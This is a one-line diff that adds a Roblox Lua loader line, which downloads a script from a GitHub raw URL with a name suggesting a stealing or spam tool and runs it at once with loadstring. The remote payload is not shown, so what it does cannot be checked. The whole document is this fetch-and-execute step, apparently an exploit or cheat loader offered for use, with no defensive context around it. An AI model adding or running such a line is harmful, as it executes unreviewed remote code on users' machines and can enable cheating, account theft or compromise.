@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/plant-steal-co-op-spam2-ze3ohkc9m59l7k.lua"))()
